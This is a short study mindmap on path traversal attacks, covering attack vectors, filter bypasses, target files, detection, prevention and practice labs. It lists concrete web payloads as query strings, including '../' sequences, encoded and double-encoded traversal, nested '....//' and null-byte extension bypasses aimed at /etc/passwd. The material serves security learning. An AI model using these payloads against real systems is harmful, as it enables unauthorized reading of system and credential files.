# Path Traversal Mindmap

```plaintext
Path Traversal
├── What is Path Traversal?
│   ├── Directory traversal
│   └── Arbitrary file read/write
├── Attack Vectors
│   ├── ../ and ..\ sequences
│   │   └── Example: ?filename=../../etc/passwd
│   ├── Absolute path injection
│   │   └── Example: ?filename=/etc/passwd
│   ├── Nested traversal (....//, ....\\)
│   │   └── Example: ?filename=....//....//etc/passwd
│   ├── URL encoding
│   │   ├── Single: ?filename=%2e%2e%2f%2e%2e%2fetc%2fpasswd
│   │   ├── Double: ?filename=%252e%252e%252fetc%252fpasswd
│   │   └── Non-standard: ?filename=..%c0%af..%c0%afetc%2fpasswd
│   ├── Null byte injection (%00)
│   │   └── Example: ?filename=../../etc/passwd%00.png
│   └── Base folder or extension bypass
│       ├── Example (base folder): ?filename=/var/www/images/../../../etc/passwd
│       └── Example (extension): ?filename=../../etc/passwd%00.png
├── Targets
│   ├── Application source code
│   ├── Credentials/config files
│   ├── OS files (e.g., /etc/passwd, win.ini)
│   └── Sensitive data
├── Obstacles & Bypasses
│   ├── Stripped traversal sequences
│   │   └── Example: Use nested traversal or encoding
│   ├── Required base folder
│   │   └── Example: /var/www/images/../../../etc/passwd
│   ├── Required file extension
│   │   └── Example: ../../etc/passwd%00.png
│   └── Non-recursive sanitization
│       └── Example: ....//etc/passwd
├── Detection & Exploitation
│   ├── Manual testing
│   ├── Automated fuzzing (Burp Intruder)
│   └── Encoded payloads
├── Prevention
│   ├── Avoid user input in file paths
│   ├── Whitelist/validate input
│   ├── Canonicalize and check path
│   └── Restrict file access to safe directories
└── Practice & Labs
    ├── Simple traversal
    ├── Absolute path bypass
    ├── Nested/encoded traversal
    ├── Base folder/extension validation
    └── Null byte bypass
```
